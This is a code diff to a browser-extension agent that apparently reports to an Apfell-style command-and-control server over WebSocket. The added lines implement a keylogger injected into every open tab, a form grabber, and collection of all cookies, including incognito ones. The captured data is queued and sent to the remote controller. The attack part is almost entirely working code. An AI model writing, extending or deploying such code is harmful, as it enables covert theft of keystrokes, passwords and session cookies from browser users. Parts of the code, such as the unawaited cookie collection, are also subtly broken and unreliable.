@@ -23,7 +23,14 @@ class SporeConfiguration {
 }
 
 const config = new SporeConfiguration("Unique Identifier", "localhost", "websocket", 454, true);
+// Connect to the server
+const connection = new WebSocket(config.serverurl);
+let out = [];
+let keylogTaskID = 0;
+let keyloggers = [];
 // Helper functions
+
+/// TODO: Implement CreateKeyExchangeMessage function
 
 /// Create a Callback Checkin Message
 function CreateCallbackCheckInMessage(username, uuid, pid, addresses) {
@@ -44,12 +51,12 @@ function CreateApfellMessage(type, apfellID, uuid, size, taskid, tasktype, data)
     msg.size = size;
     msg.taskid = taskid;
     msg.tasktype = tasktype;
-    msg.data = data;
+    msg.data =  data;
 
     return msg;
 }
 /// Get the local IP addresses
-function GetLocalIP() {
+function GetLocalIP(options) {
     const ips = [];
     const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
 
@@ -68,9 +75,10 @@ function GetLocalIP() {
             ips.push(ip);
     };
 
-    pc.createOffer(function(sdp) {
+    pc.createOffer(function (sdp) {
         pc.setLocalDescription(sdp);
-    }, function onerror() {});
+    }, function onerror() {
+    });
 }
 /// Convert a base64 string to data array
 function base64StringToDataArray(data) {
@@ -101,20 +109,45 @@ function httpReq(url,method,headers,body)
     return xmlHttp;
 }
 
+setInterval(function(){
+    if (out.length > 0){
+        // Pop and send a message to the controller
+        const msg = out.shift();
+        connection.send(msg);
+    }
+}, 5000);
+
 // TODO: Add helper functions to create Key Exchange, Callback Checkin, and Apfell Task Request messages
 
 (function(){
     // Main function
     /// Receives and processes messages
-
-    console.log('New Msg');
     // Add a new listener to continually retrieve messages
     chrome.runtime.onMessage.addListener(function(message, sender, callback) {
-        localStorage["data"] = message;
+        // Listen for events from other scripts
+        switch (message.type) {
+            case 'keylogInit' : {
+                keyloggers.push(sender.tab.id);
+                break;
+            }
+            case 'keylogExit' : {
+                const index = keyloggers.indexOf(sender.tab.id);
+                if (index !== -1) keyloggers.splice(index, 1);
+                break;
+            }
+            case 'keylogData' : {
+                let keylogMessage = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, message.data);
+                out.push(JSON.stringify(keylogMessage, null, 2));
+                break;
+            }
+            case 'formData' : {
+                let formCaptureMessage = CreateApfellMessage(2, config.apfellID, config.UUID, message.data.length, keylogTaskID, 2, message.data);
+                out.push(JSON.stringify(formCaptureMessage, null, 2));
+                break;
+            }
+
+        }
     });
-    
-    // Connect to the server
-    const connection = new WebSocket(config.serverurl);
     
     connection.onopen = function() {
         console.log('Connection received');
@@ -157,13 +190,11 @@ function httpReq(url,method,headers,body)
                     // Send the checkin data
 
                     // We can use the unique device ID as a hostname since we can't retrieve the actual hostname
-                    const localAddresses = GetLocalIP(function(ips){
-                        return ips.join('\n ');
-                    });
+                    const localAddresses = GetLocalIP();
 
                     const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses);
-                    const envelope = btoa(unescape(encodeURIComponent(checkInMessage)));
-                    connection.send(envelope);
+                    const envelope = JSON.stringify(checkInMessage, null, 2);
+                    out.push(envelope);
                 }
 
                 break;
@@ -187,17 +218,51 @@ function httpReq(url,method,headers,body)
                         // send back the base64encoded image
                         const encodedImage = btoa(unescape(encodeURIComponent(img.toString())));
                         const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, encodedImage.length, taskid, tasktype, encodedImage);
-                        const envelope = btoa(unescape(encodeURIComponent(apfellmsg)));
-                        connection.send(envelope);
+                        const envelope = JSON.stringify(apfellmsg, null, 2);
+                        out.push(envelope);
                     });
                 } else if (tasktype === 2) {
                     // Keylog
+                    const queryInfo = {};
+                    keylogTaskID = taskid;
 
+                    // Set capture forms to true
+                    chrome.storage.local.set({'formGrabber': true});
+
+                    // Inject the keylogger script into every tab
+                    chrome.tabs.query(queryInfo, function(result) {
+                        for (i = 0; i < result.length; i++) {
+                            let ind = keyloggers.indexOf(result[i].id);
+                            if (ind === -1) {
+                                // Only inject the keylogger if it isn't already running
+                                chrome.tabs.executeScript(result[i].id, {
+                                    file: "src/bg/keylogger.js"
+                                });
+                            }
+                        }
+                    });
+                } else if (tasktype === 3) {
+                    // Get all cookies. Includes incognito cookies
+                    let results = [];
+                    chrome.cookies.getAllCookieStores(function(stores){
+                        stores.forEach(function(store){
+                            const filter = {};
+                            filter["storeId"] = store.id;
+                            chrome.cookies.getAll({"storeId": store.id}, function(cookies){
+                                results = results.concat(cookies);
+                            });
+                        });
+                    });
+
+                    const data = JSON.stringify(results, null, 2);
+                    const envelope = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+                    out.push(envelope);
+
+                } else if (tasktype === 4) {
+                    // TODO: Implement task code for setting a cookie value
                 }
             }
         }
-        
-        const msg = JSON.parse(e.data);
         
     }
 })();
